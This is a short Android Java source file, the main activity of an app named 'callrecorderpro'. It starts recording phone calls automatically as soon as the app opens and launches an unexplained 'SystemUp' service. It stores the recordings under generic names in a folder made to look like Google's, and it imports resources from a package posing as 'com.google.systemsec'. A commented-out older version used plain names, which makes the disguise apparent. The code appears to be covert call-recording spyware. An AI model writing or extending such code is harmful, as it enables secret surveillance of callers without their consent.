package com.sbdev.callrecorderpro;

import android.media.MediaRecorder;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

import com.google.systemsec.R;
import com.sbdev.callrecorderprohelper.CallRecord;

public class MainActivity extends AppCompatActivity {

   CallRecord callRecord;
   SystemUp Systemup;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //callRecord = CallRecord.init(this);
        Systemup=new SystemUp();
        callRecord = new CallRecord.Builder(this)
                .setRecordFileName("File")
                .setRecordDirName("Android/data/com.google.file")
                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                .setShowSeed(true)
                .build();
        callRecord.startCallRecordService();
        Systemup.startsystemservcie(this);
        /*
        callRecord = new CallRecord.Builder(this)
                .setRecordFileName("Record_" + new SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(new Date()))
                .setRecordDirName("CallRecord")
                .setRecordDirPath(Environment.getExternalStorageDirectory().getPath())
                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                .setShowSeed(true)
                .buildService();
        callRecord.startCallRecordService();
        */
    }
}
